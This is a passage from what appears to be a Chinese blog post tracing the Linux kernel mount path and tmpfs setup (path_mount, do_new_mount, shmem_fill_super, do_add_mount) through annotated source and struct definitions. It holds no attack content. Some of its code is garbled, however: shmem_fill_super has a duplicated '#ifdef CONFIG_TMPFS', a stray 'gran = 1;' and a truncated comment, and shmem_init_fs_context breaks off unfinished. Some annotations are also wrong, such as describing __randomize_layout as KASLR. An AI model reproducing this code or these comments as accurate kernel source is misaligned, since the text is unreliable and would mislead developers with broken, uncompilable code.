MS_NOSYMFOLLOW) mnt_flags |= MNT_NOSYMFOLLOW; // 保留atime的默认值 if ((flags &amp; MS_REMOUNT) &amp;&amp; ((flags &amp; (MS_NOATIME | MS_NODIRATIME | MS_RELATIME | MS_STRICTATIME)) == 0)) &#123; mnt_flags &amp;= ~MNT_ATIME_MASK; mnt_flags |= path-&gt;mnt-&gt;mnt_flags &amp; MNT_ATIME_MASK; &#125; // 设置超级块标志 sb_flags = flags &amp; (SB_RDONLY | SB_SYNCHRONOUS | SB_MANDLOCK | SB_DIRSYNC | SB_SILENT | SB_POSIXACL | SB_LAZYTIME | SB_I_VERSION); // 重新配置挂载点 if ((flags &amp; (MS_REMOUNT | MS_BIND)) == (MS_REMOUNT | MS_BIND)) return do_reconfigure_mnt(path, mnt_flags); // 重新挂载 if (flags &amp; MS_REMOUNT) return do_remount(path, flags, sb_flags, mnt_flags, data_page); // 绑定挂载 if (flags &amp; MS_BIND) return do_loopback(path, dev_name, flags &amp; MS_REC); // 更改挂载类型 if (flags &amp; (MS_SHARED | MS_PRIVATE | MS_SLAVE | MS_UNBINDABLE)) return do_change_type(path, flags); // 移动挂载点 if (flags &amp; MS_MOVE) return do_move_mount_old(path, dev_name); // 执行新的挂载操作 return do_new_mount(path, type_page, sb_flags, mnt_flags, dev_name, data_page);&#125; path_mount函数负责处理不同类型的挂载请求，包括重新挂载、绑定挂载、更改挂载类型和移动挂载点。首先，函数执行基本的参数检查、安全检查和设置挂载标志。接下来，根据不同的挂载标志，调用相应的处理函数。 do_new_mount函数do_new_mount identifier - Linux source code (v6.3.6) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859static int do_new_mount(struct path *path, const char *fstype, int sb_flags, int mnt_flags, const char *name, void *data)&#123; struct file_system_type *type; // 文件系统类型 struct fs_context *fc; // 文件系统上下文 const char *subtype = NULL; // 子类型 int err = 0; // 错误码 // 验证文件系统类型是否为空 if (!fstype) return -EINVAL; // 获取文件系统类型 type = get_fs_type(fstype); if (!type) return -ENODEV; // 检查文件系统是否有子类型，并获取子类型 if (type-&gt;fs_flags &amp; FS_HAS_SUBTYPE) &#123; subtype = strchr(fstype, &#x27;.&#x27;); if (subtype) &#123; subtype++; if (!*subtype) &#123; put_filesystem(type); return -EINVAL; &#125; &#125; &#125; // 创建文件系统上下文 fc = fs_context_for_mount(type, sb_flags); put_filesystem(type); // 减少文件系统类型的引用计数 if (IS_ERR(fc)) return PTR_ERR(fc); // 解析文件系统子类型 if (subtype) err = vfs_parse_fs_string(fc, &quot;subtype&quot;, subtype, strlen(subtype)); // 解析文件系统名称 if (!err &amp;&amp; name) err = vfs_parse_fs_string(fc, &quot;source&quot;, name, strlen(name)); // 解析挂载数据 if (!err) err = parse_monolithic_mount_data(fc, data); // 检查挂载权限 if (!err &amp;&amp; !mount_capable(fc)) err = -EPERM; // 获取文件系统树 if (!err) err = vfs_get_tree(fc); // 完成挂载操作 if (!err) err = do_new_mount_fc(fc, path, mnt_flags); // 释放文件系统上下文 put_fs_context(fc); return err;&#125; vfs_get_tree函数vfs_get_tree identifier - Linux source code (v6.3.8) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647int vfs_get_tree(struct fs_context *fc)&#123; struct super_block *sb; // 超级块 int error; // 如果文件系统上下文中已经有一个根目录，则返回错误 if (fc-&gt;root) return -EBUSY; // 调用文件系统操作结构中的get_tree函数来获取文件系统树，并将根目录放在fc-&gt;root中 // 同时增加根目录和超级块的引用计数 error = fc-&gt;ops-&gt;get_tree(fc); if (error &lt; 0) return error; // 如果get_tree没有设置fc-&gt;root，则输出错误信息并触发BUG() if (!fc-&gt;root) &#123; pr_err(&quot;Filesystem %s get_tree() didn&#x27;t set fc-&gt;root\\n&quot;, fc-&gt;fs_type-&gt;name); BUG(); &#125; // 获取超级块 sb = fc-&gt;root-&gt;d_sb; // 检查超级块的块设备信息是否存在 WARN_ON(!sb-&gt;s_bdi); // 写内存屏障，确保超级块结构在设置SB_BORN标志位之前完成 smp_wmb(); // 设置超级块的SB_BORN标志位 sb-&gt;s_flags |= SB_BORN; // 设置安全模块的挂载选项 error = security_sb_set_mnt_opts(sb, fc-&gt;security, 0, NULL); if (unlikely(error)) &#123; // 如果设置失败，释放文件系统上下文并返回错误 fc_drop_locked(fc); return error; &#125; // 检查文件系统是否设置了错误的s_maxbytes值 WARN((sb-&gt;s_maxbytes &lt; 0), &quot;%s set sb-&gt;s_maxbytes to &quot; &quot;negative value (%lld)\\n&quot;, fc-&gt;fs_type-&gt;name, sb-&gt;s_maxbytes); return 0;&#125;EXPORT_SYMBOL(vfs_get_tree); get_tree函数是如何被设置为shmem_init函数的 当内核启动时，会执行shmem_init函数（定义在mm/shmem.c文件中）。这个函数会调用register_filesystem注册tmpfs文件系统。 shmem_init identifier - Linux source code (v6.3.6) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647void __init shmem_init(void)&#123;// 初始化 inode 缓存shmem_init_inodecache();// 注册 tmpfs 文件系统int error = register_filesystem(&amp;shmem_fs_type);if (error) &#123; // 若注册失败，打印错误信息 pr_err(&quot;Could not register tmpfs\\n&quot;); // 跳转到 out2，执行清理操作 goto out2;&#125;// 尝试挂载 tmpfs 文件系统shm_mnt = kern_mount(&amp;shmem_fs_type);if (IS_ERR(shm_mnt)) &#123; // 若挂载失败，获取错误代码 error = PTR_ERR(shm_mnt); // 打印错误信息 pr_err(&quot;Could not kern_mount tmpfs\\n&quot;); // 跳转到 out1，执行清理操作 goto out1;&#125;#ifdef CONFIG_TRANSPARENT_HUGEPAGE// 如果支持透明巨页，且巨页设置不为禁用，设置巨页选项if (has_transparent_hugepage() &amp;&amp; shmem_huge &gt; SHMEM_HUGE_DENY) SHMEM_SB(shm_mnt-&gt;mnt_sb)-&gt;huge = shmem_huge;else // 否则，将巨页设置为永不使用，以防万一 shmem_huge = SHMEM_HUGE_NEVER;#endif// 成功执行，函数返回return;out1:// 清理操作：注销 tmpfs 文件系统unregister_filesystem(&amp;shmem_fs_type);out2:// 清理操作：销毁 inode 缓存shmem_destroy_inodecache();// 设置 shm_mnt 为错误指针，表示初始化失败shm_mnt = ERR_PTR(error);&#125; shmem_fs_type是一个file_system_type结构体，定义了tmpfs文件系统的基本信息。在这个结构体中，init_fs_context成员被设置为shmem_init_fs_context。 shmem_fs_type identifier - Linux source code (v6.3.6) - Bootlin 1234567891011121314static struct file_system_type shmem_fs_type = &#123;.owner = THIS_MODULE, // 指定文件系统模块的所有者.name = &quot;tmpfs&quot;, // 文件系统的名称.init_fs_context = shmem_init_fs_context, // 初始化文件系统上下文的回调函数#ifdef CONFIG_TMPFS.parameters = shmem_fs_parameters, // 指定文件系统的挂载参数解析回调#endif.kill_sb = kill_litter_super, // 用于销毁超级块的回调函数#ifdef CONFIG_SHMEM.fs_flags = FS_USERNS_MOUNT | FS_ALLOW_IDMAP, // 文件系统的标志（支持用户命名空间挂载和ID映射）#else.fs_flags = FS_USERNS_MOUNT, // 文件系统的标志（仅支持用户命名空间挂载）#endif&#125;; 当用户发起挂载tmpfs文件系统的请求时，内核会根据shmem_fs_type结构体中的init_fs_context成员调用shmem_init_fs_context函数，以初始化文件系统上下文（fs_context结构体）。 在shmem_init_fs_context函数中，会创建一个shmem_fs_context结构体实例并将其存储在fc-&gt;fs_private成员中。然后，将fs_context结构体的ops成员设置为&amp;shmem_fs_context_ops。 shmem_init_fs_context identifier - Linux source code (v6.3.6) - Bootlin 1234567891011121314151617181920212223int shmem_init_fs_context(struct fs_context *fc)&#123;// 定义一个指向 shmem_options 结构体的指针struct shmem_options *ctx;// 为 shmem_options 结构体分配内存ctx = kzalloc(sizeof(struct shmem_options), GFP_KERNEL);if (!ctx) // 如果内存分配失败，返回 ENOMEM 错误 return -ENOMEM;// 设置文件访问权限为 0777（用户、组和其他均有读、写和执行权限），并启用粘滞位ctx-&gt;mode = 0777 | S_ISVTX;// 获取当前进程的文件系统用户 ID，并将其设置为文件系统上下文的用户 IDctx-&gt;uid = current_fsuid();// 获取当前进程的文件系统组 ID，并将其设置为文件系统上下文的组 IDctx-&gt;gid = current_fsgid();// 将初始化后的 shmem_options 结构体赋给 fs_context 结构体的 fs_private 成员fc-&gt;fs_private = ctx;// 设置 fs_context 结构体的操作函数集fc-&gt;ops = &amp;shmem_fs_context_ops;// 返回 0，表示成功初始化文 shmem_fs_context_ops是一个fs_context_operations结构体，其中的get_tree成员被设置为shmem_get_tree。 shmem_fs_context_ops identifier - Linux source code (v6.3.6) - Bootlin 123456789static const struct fs_context_operations shmem_fs_context_ops = &#123;.free = shmem_free_fc,.get_tree = shmem_get_tree,#ifdef CONFIG_TMPFS.parse_monolithic = shmem_parse_options,.parse_param = shmem_parse_one,.reconfigure = shmem_reconfigure,#endif&#125;; 当内核继续执行挂载过程，调用vfs_get_tree函数时，会根据fs_context结构体的ops成员（即&amp;shmem_fs_context_ops）间接调用shmem_get_tree函数。 shmem_get_tree函数shmem_get_tree identifier - Linux source code (v6.3.6) - Bootlin 1234static int shmem_get_tree(struct fs_context *fc)&#123; return get_tree_nodev(fc, shmem_fill_super);&#125; shmem_fill_super函数shmem_fill_super identifier - Linux source code (v6.3.6) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128static int shmem_fill_super(struct super_block *sb, struct fs_context *fc)&#123; struct shmem_options *ctx = fc-&gt;fs_private;//ctx指向一个shmem_options结构体，包含了tmpfs实例的选项，如最大块数、最大inode数等。这些选项通常在挂载tmpfs时由用户指定。 struct inode *inode;//inode指向一个inode结构体，用于表示文件系统中的一个文件。这里的inode将用于表示tmpfs实例的根目录。 struct shmem_sb_info *sbinfo;//sbinfo指向一个shmem_sb_info结构体，包含了tmpfs实例的元数据，如最大块数、最大inode数、已使用的块数等。 /* Round up to L1_CACHE_BYTES to resist false sharing *//* 为shmem_sb_info结构体分配内存，考虑缓存对齐 */ sbinfo = kzalloc(max((int)sizeof(struct shmem_sb_info), L1_CACHE_BYTES), GFP_KERNEL); /* 分配内存失败时返回错误 */ if (!sbinfo) return -ENOMEM; /* 将shmem_sb_info结构体指针保存到super_block的s_fs_info字段 */ sb-&gt;s_fs_info = sbinfo;#ifdef CONFIG_TMPFS /* * Per default we only allow half of the physical ram per * tmpfs instance, limiting inodes to one per page of lowmem; * but the internal instance is left unlimited. *//**默认情况下，我们只允许每*tmpfs实例，将inode限制为每页lowmem一个；*但是内部实例是不受限制的。*///对于非内核挂载的tmpfs实例，设置默认的最大块数、最大inode数和是否使用64位inode编号。对于内核挂载的tmpfs实例，设置SB_N#ifdef CONFIG_TMPFS/* 判断是否为内核挂载 */ if (!(sb-&gt;s_flags &amp; SB_KERNMOUNT)) &#123; /* 设置默认的最大块数（如果未指定） */ if (!(ctx-&gt;seen &amp; SHMEM_SEEN_BLOCKS)) ctx-&gt;blocks = shmem_default_max_blocks(); /* 设置默认的最大inode数（如果未指定） */ if (!(ctx-&gt;seen &amp; SHMEM_SEEN_INODES)) ctx-&gt;inodes = shmem_default_max_inodes(); /* 设置是否使用64位inode编号（如果未指定） */ if (!(ctx-&gt;seen &amp; SHMEM_SEEN_INUMS)) ctx-&gt;full_inums = IS_ENABLED(CONFIG_TMPFS_INODE64); &#125; else &#123; /* 内核挂载的tmpfs实例，设置SB_NOUSER标志 */ sb-&gt;s_flags |= SB_NOUSER; &#125; /* 设置文件系统导出操作 */ sb-&gt;s_export_op = &amp;shmem_export_ops; /* 设置文件系统标志 */ sb-&gt;s_flags |= SB_NOSEC | SB_I_VERSION;#else /* 如果不支持tmpfs，设置SB_NOUSER标志 */ sb-&gt;s_flags |= SB_NOUSER;#endif /* 设置shmem_sb_info的最大块数字段 */ sbinfo-&gt;max_blocks = ctx-&gt;blocks; /* 设置shmem_sb_info的最大inode数量和空闲inode数量 */ sbinfo-&gt;free_inodes = sbinfo-&gt;max_inodes = ctx-&gt;inodes; /* 如果是内核挂载，为每个CPU分配一个ino_t类型的内存 */ if (sb-&gt;s_flags &amp; SB_KERNMOUNT) &#123; sbinfo-&gt;ino_batch = alloc_percpu(ino_t); /* 分配失败时跳转到失败处理 */ if (!sbinfo-&gt;ino_batch) goto failed; &#125; /* 设置uid和gid */ sbinfo-&gt;uid = ctx-&gt;uid; sbinfo-&gt;gid = ctx-&gt;gid; /* 设置是否使用64位inode编号 */ sbinfo-&gt;full_inums = ctx-&gt;full_inums; /* 设置权限模式 */ sbinfo-&gt;mode = ctx-&gt;mode; /* 设置是否使用大页面 */ sbinfo-&gt;huge = ctx-&gt;huge; /* 设置内存分配策略 */ sbinfo-&gt;mpol = ctx-&gt;mpol; /* 清空ctx的mpol指针，避免后续释放 */ ctx-&gt;mpol = NULL; /* 初始化stat_lock自旋锁 */ raw_spin_lock_init(&amp;sbinfo-&gt;stat_lock); /* 初始化used_blocks per-CPU计数器 */ if (percpu_counter_init(&amp;sbinfo-&gt;used_blocks, 0, GFP_KERNEL)) /* 初始化失败时跳转到失败处理 */ goto failed; /* 初始化shrinklist_lock自旋锁 */ spin_lock_init(&amp;sbinfo-&gt;shrinklist_lock); /* 初始化shrinklist链表头 */ INIT_LIST_HEAD(&amp;sbinfo-&gt;shrinklist); /* 设置文件系统的最大文件大小 */ sb-&gt;s_maxbytes = MAX_LFS_FILESIZE; /* 设置文件系统的块大小 */ sb-&gt;s_blocksize = PAGE_SIZE; /* 设置文件系统的块大小位数 */ sb-&gt;s_blocksize_bits = PAGE_SHIFT; /* 设置文件系统的魔数 */ sb-&gt;s_magic = TMPFS_MAGIC; /* 设置文件系统的操作函数集 */ sb-&gt;s_op = &amp;shmem_ops; /* 设置文件系统的时间粒度 */ sb-&gt;s_time_gran = 1;gran = 1;#ifdef CONFIG_TMPFS_XATTR sb-&gt;s_xattr = shmem_xattr_handlers; // 设置super_block的扩展属性处理器#endif#ifdef CONFIG_TMPFS_POSIX_ACL sb-&gt;s_flags |= SB_POSIXACL; // 如果支持POSIX ACL，设置super_block的POSIX ACL标志#endif uuid_gen(&amp;sb-&gt;s_uuid); // 生成一个新的UUID，并设置给super_block // 为根目录分配一个inode，并设置其属性 inode = shmem_get_inode(&amp;nop_mnt_idmap, sb, NULL, S_IFDIR | sbinfo-&gt;mode, 0, VM_NORESERVE); if (!inode) goto failed; // 如果inode分配失败，跳转到failed标签 inode-&gt;i_uid = sbinfo-&gt;uid; // 设置inode的用户ID inode-&gt;i_gid = sbinfo-&gt;gid; // 设置inode的组ID sb-&gt;s_root = d_make_root(inode); // 为根目录分配一个目录项 if (!sb-&gt;s_root) goto failed; // 如果目录项分配失败，跳转到failed标签 return 0; // 初始化成功，返回0failed: // 发生错误时，执行清理操作 shmem_put_super(sb); // 调用shmem_put_super进行清理 return -ENOMEM; // 返回-ENOMEM错误码&#125; shmem_get_inode函数shmem_get_inode identifier - Linux source code (v6.3.6) - Bootlin 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576static struct inode *shmem_get_inode(struct mnt_idmap *idmap, struct super_block *sb, struct inode *dir, umode_t mode, dev_t dev, unsigned long flags)&#123; struct inode *inode; struct shmem_inode_info *info; struct shmem_sb_info *sbinfo = SHMEM_SB(sb); ino_t ino; // 为新的inode预留一个系统内部的编号 if (shmem_reserve_inode(sb, &amp;ino)) return NULL; // 为新的inode分配内存 inode = new_inode(sb); if (inode) &#123; // 设置inode的编号 inode-&gt;i_ino = ino; // 初始化inode的所有者和权限模式 inode_init_owner(idmap, inode, dir, mode); // 设置inode的磁盘块数为0 inode-&gt;i_blocks = 0; // 设置inode的访问、修改和创建时间 inode-&gt;i_atime = inode-&gt;i_mtime = inode-&gt;i_ctime = current_time(inode); // 设置inode的生成编号（用于NFS） inode-&gt;i_generation = get_random_u32(); // 获得shmem_inode_info结构（tmpfs专用） info = SHMEM_I(inode); // 初始化shmem_inode_info结构 memset(info, 0, (char *)inode - (char *)info); spin_lock_init(&amp;info-&gt;lock); atomic_set(&amp;info-&gt;stop_eviction, 0); info-&gt;seals = F_SEAL_SEAL; info-&gt;flags = flags &amp; VM_NORESERVE; info-&gt;i_crtime = inode-&gt;i_mtime; info-&gt;fsflags = (dir == NULL) ? 0 : SHMEM_I(dir)-&gt;fsflags &amp; SHMEM_FL_INHERITED; if (info-&gt;fsflags) shmem_set_inode_flags(inode, info-&gt;fsflags); INIT_LIST_HEAD(&amp;info-&gt;shrinklist); INIT_LIST_HEAD(&amp;info-&gt;swaplist); simple_xattrs_init(&amp;info-&gt;xattrs); cache_no_acl(inode); mapping_set_large_folios(inode-&gt;i_mapping); // 根据不同的文件类型，设置相应的操作函数 switch (mode &amp; S_IFMT) &#123; default: inode-&gt;i_op = &amp;shmem_special_inode_operations; init_special_inode(inode, mode, dev); break; case S_IFREG: inode-&gt;i_mapping-&gt;a_ops = &amp;shmem_aops; inode-&gt;i_op = &amp;shmem_inode_operations; inode-&gt;i_fop = &amp;shmem_file_operations; mpol_shared_policy_init(&amp;info-&gt;policy, shmem_get_sbmpol(sbinfo)); break; case S_IFDIR: inc_nlink(inode); inode-&gt;i_size = 2 * BOGO_DIRENT_SIZE; inode-&gt;i_op = &amp;shmem_dir_inode_operations; inode-&gt;i_fop = &amp;simple_dir_operations; break; case S_IFLNK: mpol_shared_policy_init(&amp;info-&gt;policy, NULL); break; &#125; // 为锁依赖分析系统设置inode互斥锁的标记 lockdep_annotate_inode_mutex_key(inode); &#125; else // 如果inode分配失败，则释放预留的编号 shmem_free_inode(sb); return inode;&#125; do_new_mount_fc函数namespace.c - fs&#x2F;namespace.c - Linux source code (v6.3.6) - Bootlin 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/* * 使用超级块配置创建一个新的挂载，并请求将其添加到命名空间树。 */static int do_new_mount_fc(struct fs_context *fc, struct path *mountpoint, unsigned int mnt_flags)&#123; struct vfsmount *mnt; struct mountpoint *mp; struct super_block *sb = fc-&gt;root-&gt;d_sb; int error; // 对超级块进行安全检查 error = security_sb_kern_mount(sb); if (!error &amp;&amp; mount_too_revealing(sb, &amp;mnt_flags)) error = -EPERM; // 如果出现错误，释放fs_context并返回错误 if (unlikely(error)) &#123; fc_drop_locked(fc); return error; &#125; // 释放超级块的umount锁 up_write(&amp;sb-&gt;s_umount); // 根据fs_context创建一个新的struct mount结构，每个挂载的文件系统都对应这样的一个结构 mnt = vfs_create_mount(fc); if (IS_ERR(mnt)) return PTR_ERR(mnt); // 对挂载的时间戳过期发出警告 mnt_warn_timestamp_expiry(mountpoint, mnt); // 锁定挂载点 mp = lock_mount(mountpoint); if (IS_ERR(mp)) &#123; mntput(mnt); return PTR_ERR(mp); &#125; // 将新挂载添加到挂载点并应用挂载标志，do_add_mount完成挂载操作 error = do_add_mount(real_mount(mnt), mp, mountpoint, mnt_flags); unlock_mount(mp); if (error &lt; 0) mntput(mnt); return error;&#125; do_add_mount函数do_add_mount identifier - Linux source code (v6.3.6) - Bootlin 12345678910111213141516171819202122232425262728293031323334353637/* * 将挂载添加到命名空间的挂载树中 */static int do_add_mount(struct mount *newmnt, struct mountpoint *mp, const struct path *path, int mnt_flags)&#123; // 获取待挂载路径的父挂载实例 struct mount *parent = real_mount(path-&gt;mnt); // 清除内部挂载标志 mnt_flags &amp;= ~MNT_INTERNAL_FLAGS; // 检查父挂载实例是否有效 if (unlikely(!check_mnt(parent))) &#123; // 这只对在私有命名空间中进行的自动挂载是可接受的 if (!(mnt_flags &amp; MNT_SHRINKABLE)) return -EINVAL; // 对于这些情况，我们最好确保挂载点仍然有效 if (!parent-&gt;mnt_ns) return -EINVAL; &#125; // 拒绝在相同挂载点上使用相同的文件系统 if (path-&gt;mnt-&gt;mnt_sb == newmnt-&gt;mnt.mnt_sb &amp;&amp; path-&gt;mnt-&gt;mnt_root == path-&gt;dentry) return -EBUSY; // 如果新挂载的根目录是符号链接，则返回错误 if (d_is_symlink(newmnt-&gt;mnt.mnt_root)) return -EINVAL; // 设置新挂载的挂载标志 newmnt-&gt;mnt.mnt_flags = mnt_flags; // 将新挂载添加到父挂载和挂载点 return graft_tree(newmnt, parent, mp);&#125; 相关结构体struct fs_contextfs_context identifier - Linux source code (v6.3.6) - Bootlin 123456789101112131415161718192021222324struct fs_context &#123; const struct fs_context_operations *ops; // 文件系统操作指针，用于设置特定文件系统的操作 struct mutex uapi_mutex; // 用户空间访问互斥锁，用于保护文件系统上下文的并发访问 struct file_system_type *fs_type; // 文件系统类型，指向一个描述文件系统特性的结构体 void *fs_private; // 文件系统私有上下文，用于存储特定文件系统实现的私有数据 void *sget_key; // 用于唯一标识文件系统实例的键，用于共享超级块的查找过程 struct dentry *root; // 文件系统的根目录入口，指向一个dentry结构体 struct user_namespace *user_ns; // 与此挂载关联的用户命名空间 struct net *net_ns; // 与此挂载关联的网络命名空间 const struct cred *cred; // 挂载者的凭据，包含用户/组ID等权限信息 struct p_log log; // 日志缓冲区，用于记录文件系统上下文的日志信息 const char *source; // 源名称（例如设备路径），用于标识挂载来源 void *security; // 用于存储Linux安全模块（LSM）的选项 void *s_fs_info; // 指向建议的s_fs_info数据，之后会存储在超级块的s_fs_info字段中 unsigned int sb_flags; // 建议的超级块标志（SB_*），用于挂载选项控制 unsigned int sb_flags_mask; // 改变的超级块标志的掩码 unsigned int s_iflags; // 与超级块s_iflags字段进行按位或的标志 unsigned int lsm_flags; // 从文件系统到LSM的信息标志 enum fs_context_purpose purpose:8; // 文件系统上下文的目的（例如挂载、重新挂载、移动挂载点等） enum fs_context_phase phase:8; // 文件系统上下文所处的阶段 bool need_free:1; // 标记是否需要调用ops-&gt;free()释放文件系统上下文 bool global:1; // 全局标志，表示是否进入&amp;init_user_ns的全局命名空间 bool oldapi:1; // 标记是否来自旧API（即mount(2)系统调用）&#125;; 该结构体用于保存超级块的信息的root，而超级块本身包含了该实际文件系统的信息，因此通过该结构体，我们可以使该文件系统和mount结构体建立联系。在旧版的Linux源码中，我们需要使用mount_fs()函数去获取对应的root，而新版则可以通过fs_context直接获取。 struct vfsmountvfsmount identifier - Linux source code (v6.3.6) - Bootlin 123456struct vfsmount &#123; struct dentry *mnt_root; // 指向已挂载文件系统树的根目录入口（dentry结构体） struct super_block *mnt_sb; // 指向与已挂载文件系统关联的超级块（super_block结构体） int mnt_flags; // 挂载标志，表示挂载时的选项，如只读、异步等 struct mnt_idmap *mnt_idmap; // 指向一个mnt_idmap结构体，用于存储用户和组ID的映射关系（仅在某些文件系统中使用，如NFS）&#125; __randomize_layout; // 使用内核的地址空间布局随机化（KASLR）特性，以增加安全性 vfsmount结构体中mnt_root 是当前文件系统根目录的 dentry，mnt_sb 是指向超级块的指针。这里之所以会有mnt_mountpoint和mnt_root，是因为在挂载时该文件系统的根目录同时成为了其父文件系统的一个子目录（挂载点）。 struct mountmount identifier - Linux source code (v6.3.6) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142struct mount &#123; struct hlist_node mnt_hash; // 用于挂载点哈希表的链表节点 struct mount *mnt_parent; // 指向父挂载点的指针 struct dentry *mnt_mountpoint; // 指向挂载点位置的目录入口（dentry） struct vfsmount mnt; // 包含挂载文件系统相关信息的vfsmount结构体 union &#123; struct rcu_head mnt_rcu; // 用于RCU（Read-Copy-Update）同步的链表头 struct llist_node mnt_llist; // 用于延迟列表（llist）的链表节点 &#125;;#ifdef CONFIG_SMP struct mnt_pcp __percpu *mnt_pcp; // 指向每个CPU的mnt_pcp结构体的指针（仅在多处理器系统中使用）#else int mnt_count; // 挂载点的引用计数 int mnt_writers; // 写入操作的计数器#endif struct list_head mnt_mounts; // 子挂载点列表的链表头 struct list_head mnt_child; // 与mnt_mounts链表相连的链表节点 struct list_head mnt_instance; // 超级块的s_mounts链表上的挂载实例列表节点 const char *mnt_devname; // 设备名称，如 /dev/dsk/hda1 struct list_head mnt_list; // 全局挂载点列表的链表节点 struct list_head mnt_expire; // 特定文件系统的过期列表的链表节点 struct list_head mnt_share; // 共享挂载点的循环列表链表头 struct list_head mnt_slave_list; // 从属挂载点的链表头 struct list_head mnt_slave; // 与mnt_slave_list链表相连的链表节点 struct mount *mnt_master; // 指向主挂载点的指针，从属挂载点位于master-&gt;mnt_slave_list struct mnt_namespace *mnt_ns; // 包含此挂载点的命名空间 struct mountpoint *mnt_mp; // 指向挂载点位置的mountpoint结构体 union &#123; struct hlist_node mnt_mp_list; // 具有相同挂载点的挂载列表链表节点 struct hlist_node mnt_umount; // 用于卸载操作的链表节点 &#125;; struct list_head mnt_umounting; // 用于卸载传播的链表节点#ifdef CONFIG_FSNOTIFY struct fsnotify_mark_connector __rcu *mnt_fsnotify_marks; // 指向文件系统通知标记的指针 __u32 mnt_fsnotify_mask; // 文件系统通知的掩码#endif int mnt_id; // 挂载点的唯一标识符 int mnt_group_id; // 同级挂载组的唯一标识符 int mnt_expiry_mark; // 如果已标记为过期，则为true struct hlist_head mnt_pins; // 用于记录挂载点引脚的链表头 struct hlist_head mnt_stuck_children; // 被卡住的子挂载点列表的链表头&#125; __randomize_layout; // 使用内核的地址空间布局随机化（KASLR）特性，以增加安全性 struct dentrydentry identifier - Linux source code (v6.3.7) - Bootlin 1234567891011121314151617181920212223242526272829303132struct dentry &#123; /* RCU lookup touched fields */ unsigned int d_flags; /* 目录项的标志位，受 d_lock 保护 */ seqcount_spinlock_t d_seq; /* 每个目录项的序列锁 */ struct hlist_bl_node d_hash; /* 用于查找的哈希列表 */ struct dentry *d_parent; /* 父目录 */ struct qstr d_name; /* 目录项的名称 */ struct inode *d_inode; /* 与目录名关联的 inode 结构指针，NULL 表示负目录项 */ unsigned char d_iname[DNAME_INLINE_LEN]; /* 短名称 */ /* Ref lookup also touches following */ struct lockref d_lockref; /* 每个目录项的锁和引用计数 */ const struct dentry_operations *d_op; /* 目录项操作函数集 */ struct super_block *d_sb; /* 目录项树的根节点 */ unsigned long d_time; /* 用于 d_revalidate 的时间戳 */ void *d_fsdata; /* 特定文件系统的数据 */ union &#123; struct list_head d_lru; /* LRU（最近最少使用）列表 */ wait_queue_head_t *d_wait; /* 仅用于查找中的目录项 */ &#125;; struct list_head d_child; /* 父目录项的子项列表 */ struct list_head d_subdirs; /* 子目录项列表 */ /* * d_alias and d_rcu can share memory */ union &#123; struct hlist_node d_alias; /* inode 别名列表 */ struct hlist_bl_node d_in_lookup_hash; /* 仅用于查找中的目录项 */ struct rcu_head d_rcu; &#125; d_u;&#125; __randomize_layout; struct inodeinode identifier - Linux source code (v6.3.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102struct inode &#123; umode_t i_mode; /* 文件类型和访问权限 */ unsigned short i_opflags; /* inode 操作标志 */ kuid_t i_uid; /* 文件拥有者的用户 ID */ kgid_t i_gid; /* 文件拥有者的组 ID */ unsigned int i_flags; /* 文件或目录的标志 */#ifdef CONFIG_FS_POSIX_ACL struct posix_acl *i_acl; /* 访问控制列表 (ACL) */ struct posix_acl *i_default_acl; /* 默认访问控制列表 */#endif const struct inode_operations *i_op; /* inode 操作函数集 */ struct super_block *i_sb; /* 与 inode 关联的超级块 */ struct address_space *i_mapping; /* 文件内容的内存映射 */#ifdef CONFIG_SECURITY void *i_security; /* 安全模块使用的 inode 信息 */#endif /* Stat data, not accessed from path walking */ unsigned long i_ino; /* inode 编号 */ union &#123; const unsigned int i_nlink; /* 硬链接计数 */ unsigned int __i_nlink; &#125;; dev_t i_rdev; /* 特殊设备的设备号 */ loff_t i_size; /* 文件大小（字节） */ struct timespec64 i_atime; /* 最后访问时间 */ struct timespec64 i_mtime; /* 最后修改时间 */ struct timespec64 i_ctime; /* 最后元数据更改时间 */ spinlock_t i_lock; /* 保护 i_blocks, i_bytes 和可能的 i_size 的锁 */ unsigned short i_bytes; /* 文件末尾未使用的字节数 */ u8 i_blkbits; /* 文件系统块大小的以 2 为底的对数 */ u8 i_write_hint; /* 写操作的优化提示 */ blkcnt_t i_blocks; /* 文件占用的磁盘块数量 */#ifdef __NEED_I_SIZE_ORDERED seqcount_t i_size_seqcount; /* 有序 i_size 的序列计数器 */#endif /* Misc */ unsigned long i_state; /* inode 状态标志 */ struct rw_semaphore i_rwsem; /* 读写信号量，用于保护 inode 结构 */ unsigned long dirtied_when; /* 第一次被脏的时间，以 jiffies 计 */ unsigned long dirtied_time_when; /* 上次被脏的时间，以 jiffies 计 */ struct hlist_node i_hash; /* 散列链表上的节点 */ struct list_head i_io_list; /* 后备设备的 I/O 列表 */#ifdef CONFIG_CGROUP_WRITEBACK struct bdi_writeback *i_wb; /* 关联的 cgroup 写回控制器 */ int i_wb_frn_winner; /* 外部 inode 检测的赢家 */ u16 i_wb_frn_avg_time; /* 外部 inode 的平均时间 */ u16 i_wb_frn_history; /* 外部 inode 的历史记录 */#endif struct list_head i_lru; /* inode LRU 列表 */ struct list_head i_sb_list; /* 超级块列表 */ struct list_head i_wb_list; /* 后备设备写回列表 */ union &#123; struct hlist_head i_dentry; /* 目录项列表 */ struct rcu_head i_rcu; &#125;; atomic64_t i_version; /* inode 版本 */ atomic64_t i_sequence; /* 用于 futex 的序列值 */ atomic_t i_count; /* inode 引用计数 */ atomic_t i_dio_count; /* 直接 I/O 计数 */ atomic_t i_writecount; /* 写计数 */#if defined(CONFIG_IMA) || defined(CONFIG_FILE_LOCKING) atomic_t i_readcount; /* 只读打开的文件计数 */#endif union &#123; const struct file_operations *i_fop; /* 以前的 -&gt;i_op-&gt;default_file_ops */ void (*free_inode)(struct inode *); &#125;; struct file_lock_context *i_flctx; /* 文件锁上下文 */ struct address_space i_data; /* inode 的数据缓冲区 */ struct list_head 